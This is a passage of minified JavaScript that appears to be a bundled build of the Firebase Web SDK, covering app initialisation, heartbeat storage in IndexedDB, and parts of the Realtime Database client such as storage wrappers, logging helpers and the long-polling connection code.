 */const bd="[DEFAULT]",Sw={[yd]:"fire-core",[q_]:"fire-core-compat",[J_]:"fire-analytics",[X_]:"fire-analytics-compat",[ew]:"fire-app-check",[Z_]:"fire-app-check-compat",[tw]:"fire-auth",[nw]:"fire-auth-compat",[rw]:"fire-rtdb",[sw]:"fire-data-connect",[iw]:"fire-rtdb-compat",[ow]:"fire-fn",[aw]:"fire-fn-compat",[lw]:"fire-iid",[cw]:"fire-iid-compat",[dw]:"fire-fcm",[uw]:"fire-fcm-compat",[pw]:"fire-perf",[fw]:"fire-perf-compat",[hw]:"fire-rc",[mw]:"fire-rc-compat",[gw]:"fire-gcs",[xw]:"fire-gcs-compat",[vw]:"fire-fst",[bw]:"fire-fst-compat",[yw]:"fire-vertex","fire-js":"fire-js",[_w]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const za=new Map,Cw=new Map,_d=new Map;function Gf(t,e){try{t.container.addComponent(e)}catch(n){Ln.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function Ma(t){const e=t.name;if(_d.has(e))return Ln.debug(`There were multiple attempts to register component ${e}.`),!1;_d.set(e,t);for(const n of za.values())Gf(n,t);for(const n of Cw.values())Gf(n,t);return!0}function jw(t,e){const n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kw={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},sr=new _x("app","Firebase",kw);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nw{constructor(e,n,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},n),this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new Qi("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw sr.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ew=ww;function kx(t,e={}){let n=t;typeof e!="object"&&(e={name:e});const r=Object.assign({name:bd,automaticDataCollectionEnabled:!1},e),s=r.name;if(typeof s!="string"||!s)throw sr.create("bad-app-name",{appName:String(s)});if(n||(n=yx()),!n)throw sr.create("no-options");const o=za.get(s);if(o){if(gd(n,o.options)&&gd(r,o.config))return o;throw sr.create("duplicate-app",{appName:s})}const a=new A_(s);for(const c of _d.values())a.addComponent(c);const l=new Nw(n,r,a);return za.set(s,l),l}function Iw(t=bd){const e=za.get(t);if(!e&&t===bd&&yx())return kx();if(!e)throw sr.create("no-app",{appName:t});return e}function vs(t,e,n){var r;let s=(r=Sw[t])!==null&&r!==void 0?r:t;n&&(s+=`-${n}`);const o=s.match(/\s|\//),a=e.match(/\s|\//);if(o||a){const l=[`Unable to register library "${s}" with version "${e}":`];o&&l.push(`library name "${s}" contains illegal characters (whitespace or "/")`),o&&a&&l.push("and"),a&&l.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Ln.warn(l.join(" "));return}Ma(new Qi(`${s}-version`,()=>({library:s,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Rw="firebase-heartbeat-database",Tw=1,qi="firebase-heartbeat-store";let uc=null;function Nx(){return uc||(uc=V_(Rw,Tw,{upgrade:(t,e)=>{switch(e){case 0:try{t.createObjectStore(qi)}catch(n){console.warn(n)}}}}).catch(t=>{throw sr.create("idb-open",{originalErrorMessage:t.message})})),uc}async function Aw(t){try{const n=(await Nx()).transaction(qi),r=await n.objectStore(qi).get(Ex(t));return await n.done,r}catch(e){if(e instanceof mo)Ln.warn(e.message);else{const n=sr.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});Ln.warn(n.message)}}}async function Yf(t,e){try{const r=(await Nx()).transaction(qi,"readwrite");await r.objectStore(qi).put(e,Ex(t)),await r.done}catch(n){if(n instanceof mo)Ln.warn(n.message);else{const r=sr.create("idb-set",{originalErrorMessage:n==null?void 0:n.message});Ln.warn(r.message)}}}function Ex(t){return`${t.name}!${t.options.appId}`}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Pw=1024,Dw=30*24*60*60*1e3;class Lw{constructor(e){this.container=e,this._heartbeatsCache=null;const n=this.container.getProvider("app").getImmediate();this._storage=new Mw(n),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){var e,n;try{const s=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),o=Kf();return((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,((n=this._heartbeatsCache)===null||n===void 0?void 0:n.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===o||this._heartbeatsCache.heartbeats.some(a=>a.date===o)?void 0:(this._heartbeatsCache.heartbeats.push({date:o,agent:s}),this._heartbeatsCache.heartbeats=this._heartbeatsCache.heartbeats.filter(a=>{const l=new Date(a.date).valueOf();return Date.now()-l<=Dw}),this._storage.overwrite(this._heartbeatsCache))}catch(r){Ln.warn(r)}}async getHeartbeatsHeader(){var e;try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";const n=Kf(),{heartbeatsToSend:r,unsentEntries:s}=zw(this._heartbeatsCache.heartbeats),o=Da(JSON.stringify({version:2,heartbeats:r}));return this._heartbeatsCache.lastSentHeartbeatDate=n,s.length>0?(this._heartbeatsCache.heartbeats=s,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),o}catch(n){return Ln.warn(n),""}}}function Kf(){return new Date().toISOString().substring(0,10)}function zw(t,e=Pw){const n=[];let r=t.slice();for(const s of t){const o=n.find(a=>a.agent===s.agent);if(o){if(o.dates.push(s.date),Qf(n)>e){o.dates.pop();break}}else if(n.push({agent:s.agent,dates:[s.date]}),Qf(n)>e){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}class Mw{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return y_()?b_().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const n=await Aw(this.app);return n!=null&&n.heartbeats?n:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){var n;if(await this._canUseIndexedDBPromise){const s=await this.read();return Yf(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:s.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var n;if(await this._canUseIndexedDBPromise){const s=await this.read();return Yf(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:s.lastSentHeartbeatDate,heartbeats:[...s.heartbeats,...e.heartbeats]})}else return}}function Qf(t){return Da(JSON.stringify({version:2,heartbeats:t})).length}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ow(t){Ma(new Qi("platform-logger",e=>new K_(e),"PRIVATE")),Ma(new Qi("heartbeat",e=>new Lw(e),"PRIVATE")),vs(yd,Vf,t),vs(yd,Vf,"esm2017"),vs("fire-js","")}Ow("");var Fw="firebase",Ww="10.14.1";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */vs(Fw,Ww,"app");var qf={};const Xf="@firebase/database",Jf="1.0.8";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ix="";function $w(t){Ix=t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Bw{constructor(e){this.domStorage_=e,this.prefix_="firebase:"}set(e,n){n==null?this.domStorage_.removeItem(this.prefixedName_(e)):this.domStorage_.setItem(this.prefixedName_(e),Ue(n))}get(e){const n=this.domStorage_.getItem(this.prefixedName_(e));return n==null?null:Ki(n)}remove(e){this.domStorage_.removeItem(this.prefixedName_(e))}prefixedName_(e){return this.prefix_+e}toString(){return this.domStorage_.toString()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Uw{constructor(){this.cache_={},this.isInMemoryStorage=!0}set(e,n){n==null?delete this.cache_[e]:this.cache_[e]=n}get(e){return gn(this.cache_,e)?this.cache_[e]:null}remove(e){delete this.cache_[e]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Rx=function(t){try{if(typeof window<"u"&&typeof window[t]<"u"){const e=window[t];return e.setItem("firebase:sentinel","cache"),e.removeItem("firebase:sentinel"),new Bw(e)}}catch{}return new Uw},Er=Rx("localStorage"),Hw=Rx("sessionStorage");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ys=new Sx("@firebase/database"),Vw=function(){let t=1;return function(){return t++}}(),Tx=function(t){const e=E_(t),n=new N_;n.update(e);const r=n.digest();return Ou.encodeByteArray(r)},go=function(...t){let e="";for(let n=0;n<t.length;n++){const r=t[n];Array.isArray(r)||r&&typeof r=="object"&&typeof r.length=="number"?e+=go.apply(null,r):typeof r=="object"?e+=Ue(r):e+=r,e+=" "}return e};let ji=null,Zf=!0;const Gw=function(t,e){$(!0,"Can't turn on custom loggers persistently."),ys.logLevel=xe.VERBOSE,ji=ys.log.bind(ys)},Ze=function(...t){if(Zf===!0&&(Zf=!1,ji===null&&Hw.get("logging_enabled")===!0&&Gw()),ji){const e=go.apply(null,t);ji(e)}},xo=function(t){return function(...e){Ze(t,...e)}},wd=function(...t){const e="FIREBASE INTERNAL ERROR: "+go(...t);ys.error(e)},zn=function(...t){const e=`FIREBASE FATAL ERROR: ${go(...t)}`;throw ys.error(e),new Error(e)},ft=function(...t){const e="FIREBASE WARNING: "+go(...t);ys.warn(e)},Yw=function(){typeof window<"u"&&window.location&&window.location.protocol&&window.location.protocol.indexOf("https:")!==-1&&ft("Insecure Firebase access from a secure page. Please use https in calls to new Firebase().")},Wu=function(t){return typeof t=="number"&&(t!==t||t===Number.POSITIVE_INFINITY||t===Number.NEGATIVE_INFINITY)},Kw=function(t){if(document.readyState==="complete")t();else{let e=!1;const n=function(){if(!document.body){setTimeout(n,Math.floor(10));return}e||(e=!0,t())};document.addEventListener?(document.addEventListener("DOMContentLoaded",n,!1),window.addEventListener("load",n,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",()=>{document.readyState==="complete"&&n()}),window.attachEvent("onload",n))}},Is="[MIN_NAME]",zr="[MAX_NAME]",Br=function(t,e){if(t===e)return 0;if(t===Is||e===zr)return-1;if(e===Is||t===zr)return 1;{const n=eh(t),r=eh(e);return n!==null?r!==null?n-r===0?t.length-e.length:n-r:-1:r!==null?1:t<e?-1:1}},Qw=function(t,e){return t===e?0:t<e?-1:1},li=function(t,e){if(e&&t in e)return e[t];throw new Error("Missing required key ("+t+") in object: "+Ue(e))},$u=function(t){if(typeof t!="object"||t===null)return Ue(t);const e=[];for(const r in t)e.push(r);e.sort();let n="{";for(let r=0;r<e.length;r++)r!==0&&(n+=","),n+=Ue(e[r]),n+=":",n+=$u(t[e[r]]);return n+="}",n},Ax=function(t,e){const n=t.length;if(n<=e)return[t];const r=[];for(let s=0;s<n;s+=e)s+e>n?r.push(t.substring(s,n)):r.push(t.substring(s,s+e));return r};function nt(t,e){for(const n in t)t.hasOwnProperty(n)&&e(n,t[n])}const Px=function(t){$(!Wu(t),"Invalid JSON number");const e=11,n=52,r=(1<<e-1)-1;let s,o,a,l,c;t===0?(o=0,a=0,s=1/t===-1/0?1:0):(s=t<0,t=Math.abs(t),t>=Math.pow(2,1-r)?(l=Math.min(Math.floor(Math.log(t)/Math.LN2),r),o=l+r,a=Math.round(t*Math.pow(2,n-l)-Math.pow(2,n))):(o=0,a=Math.round(t/Math.pow(2,1-r-n))));const d=[];for(c=n;c;c-=1)d.push(a%2?1:0),a=Math.floor(a/2);for(c=e;c;c-=1)d.push(o%2?1:0),o=Math.floor(o/2);d.push(s?1:0),d.reverse();const p=d.join("");let f="";for(c=0;c<64;c+=8){let u=parseInt(p.substr(c,8),2).toString(16);u.length===1&&(u="0"+u),f=f+u}return f.toLowerCase()},qw=function(){return!!(typeof window=="object"&&window.chrome&&window.chrome.extension&&!/^chrome/.test(window.location.href))},Xw=function(){return typeof Windows=="object"&&typeof Windows.UI=="object"};function Jw(t,e){let n="Unknown Error";t==="too_big"?n="The data requested exceeds the maximum size that can be accessed with a single request.":t==="permission_denied"?n="Client doesn't have permission to access the desired data.":t==="unavailable"&&(n="The service is unavailable");const r=new Error(t+" at "+e._path.toString()+": "+n);return r.code=t.toUpperCase(),r}const Zw=new RegExp("^-?(0*)\\d{1,10}$"),eS=-2147483648,tS=2147483647,eh=function(t){if(Zw.test(t)){const e=Number(t);if(e>=eS&&e<=tS)return e}return null},$s=function(t){try{t()}catch(e){setTimeout(()=>{const n=e.stack||"";throw ft("Exception was thrown by user callback.",n),e},Math.floor(0))}},nS=function(){return(typeof window=="object"&&window.navigator&&window.navigator.userAgent||"").search(/googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i)>=0},ki=function(t,e){const n=setTimeout(t,e);return typeof n=="number"&&typeof Deno<"u"&&Deno.unrefTimer?Deno.unrefTimer(n):typeof n=="object"&&n.unref&&n.unref(),n};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rS{constructor(e,n){this.appName_=e,this.appCheckProvider=n,this.appCheck=n==null?void 0:n.getImmediate({optional:!0}),this.appCheck||n==null||n.get().then(r=>this.appCheck=r)}getToken(e){return this.appCheck?this.appCheck.getToken(e):new Promise((n,r)=>{setTimeout(()=>{this.appCheck?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){var n;(n=this.appCheckProvider)===null||n===void 0||n.get().then(r=>r.addTokenListener(e))}notifyForInvalidToken(){ft(`Provided AppCheck credentials for the app named "${this.appName_}" are invalid. This usually indicates your app was not initialized correctly.`)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sS{constructor(e,n,r){this.appName_=e,this.firebaseOptions_=n,this.authProvider_=r,this.auth_=null,this.auth_=r.getImmediate({optional:!0}),this.auth_||r.onInit(s=>this.auth_=s)}getToken(e){return this.auth_?this.auth_.getToken(e).catch(n=>n&&n.code==="auth/token-not-initialized"?(Ze("Got auth/token-not-initialized error.  Treating as null token."),null):Promise.reject(n)):new Promise((n,r)=>{setTimeout(()=>{this.auth_?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){this.auth_?this.auth_.addAuthTokenListener(e):this.authProvider_.get().then(n=>n.addAuthTokenListener(e))}removeTokenChangeListener(e){this.authProvider_.get().then(n=>n.removeAuthTokenListener(e))}notifyForInvalidToken(){let e='Provided authentication credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly. ';"credential"in this.firebaseOptions_?e+='Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':"serviceAccount"in this.firebaseOptions_?e+='Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':e+='Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.',ft(e)}}class aa{constructor(e){this.accessToken=e}getToken(e){return Promise.resolve({accessToken:this.accessToken})}addTokenChangeListener(e){e(this.accessToken)}removeTokenChangeListener(e){}notifyForInvalidToken(){}}aa.OWNER="owner";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Bu="5",Dx="v",Lx="s",zx="r",Mx="f",Ox=/(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,Fx="ls",Wx="p",Sd="ac",$x="websocket",Bx="long_polling";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ux{constructor(e,n,r,s,o=!1,a="",l=!1,c=!1){this.secure=n,this.namespace=r,this.webSocketOnly=s,this.nodeAdmin=o,this.persistenceKey=a,this.includeNamespaceInQueryParams=l,this.isUsingEmulator=c,this._host=e.toLowerCase(),this._domain=this._host.substr(this._host.indexOf(".")+1),this.internalHost=Er.get("host:"+e)||this._host}isCacheableHost(){return this.internalHost.substr(0,2)==="s-"}isCustomHost(){return this._domain!=="firebaseio.com"&&this._domain!=="firebaseio-demo.com"}get host(){return this._host}set host(e){e!==this.internalHost&&(this.internalHost=e,this.isCacheableHost()&&Er.set("host:"+this._host,this.internalHost))}toString(){let e=this.toURLString();return this.persistenceKey&&(e+="<"+this.persistenceKey+">"),e}toURLString(){const e=this.secure?"https://":"http://",n=this.includeNamespaceInQueryParams?`?ns=${this.namespace}`:"";return`${e}${this.host}/${n}`}}function iS(t){return t.host!==t.internalHost||t.isCustomHost()||t.includeNamespaceInQueryParams}function Hx(t,e,n){$(typeof e=="string","typeof type must == string"),$(typeof n=="object","typeof params must == object");let r;if(e===$x)r=(t.secure?"wss://":"ws://")+t.internalHost+"/.ws?";else if(e===Bx)r=(t.secure?"https://":"http://")+t.internalHost+"/.lp?";else throw new Error("Unknown connection type: "+e);iS(t)&&(n.ns=t.namespace);const s=[];return nt(n,(o,a)=>{s.push(o+"="+a)}),r+s.join("&")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class oS{constructor(){this.counters_={}}incrementCounter(e,n=1){gn(this.counters_,e)||(this.counters_[e]=0),this.counters_[e]+=n}get(){return a_(this.counters_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pc={},fc={};function Uu(t){const e=t.toString();return pc[e]||(pc[e]=new oS),pc[e]}function aS(t,e){const n=t.toString();return fc[n]||(fc[n]=e()),fc[n]}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lS{constructor(e){this.onMessage_=e,this.pendingResponses=[],this.currentResponseNum=0,this.closeAfterResponse=-1,this.onClose=null}closeAfter(e,n){this.closeAfterResponse=e,this.onClose=n,this.closeAfterResponse<this.currentResponseNum&&(this.onClose(),this.onClose=null)}handleResponse(e,n){for(this.pendingResponses[e]=n;this.pendingResponses[this.currentResponseNum];){const r=this.pendingResponses[this.currentResponseNum];delete this.pendingResponses[this.currentResponseNum];for(let s=0;s<r.length;++s)r[s]&&$s(()=>{this.onMessage_(r[s])});if(this.currentResponseNum===this.closeAfterResponse){this.onClose&&(this.onClose(),this.onClose=null);break}this.currentResponseNum++}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const th="start",cS="close",dS="pLPCommand",uS="pRTLPCB",Vx="id",Gx="pw",Yx="ser",pS="cb",fS="seg",hS="ts",mS="d",gS="dframe",Kx=1870,Qx=30,xS=Kx-Qx,vS=25e3,yS=3e4;class us{constructor(e,n,r,s,o,a,l){this.connId=e,this.repoInfo=n,this.applicationId=r,this.appCheckToken=s,this.authToken=o,this.transportSessionId=a,this.lastSessionId=l,this.bytesSent=0,this.bytesReceived=0,this.everConnected_=!1,this.log_=xo(e),this.stats_=Uu(n),this.urlFn=c=>(this.appCheckToken&&(c[Sd]=this.appCheckToken),Hx(n,Bx,c))}open(e,n){this.curSegmentNum=0,this.onDisconnect_=n,this.myPacketOrderer=new lS(e),this.isClosed_=!1,this.connectTimeoutTimer_=setTimeout(()=>{this.log_("Timed out trying to connect."),this.onClosed_(),this.connectTimeoutTimer_=null},Math.floor(yS)),Kw(()=>{if(this.isClosed_)return;this.scriptTagHolder=new Hu((...o)=>{const[a,l,c,d,p]=o;if(this.incrementIncomingBytes_(o),!!this.scriptTagHolder)if(this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null),this.everConnected_=!0,a===th)this.id=l,this.password=c;else if(a===cS)l?(this.scriptTagHolder.sendNewPolls=!1,this.myPacketOrderer.closeAfter(l,()=>{this.onClosed_()})):this.onClosed_();else throw new Error("Unrecognized command received: "+a)},(...o)=>{const[a,l]=o;this.incrementIncomingBytes_(o),this.myPacketOrderer.handleResponse(a,l)},()=>{this.onClosed_()},this.urlFn);const 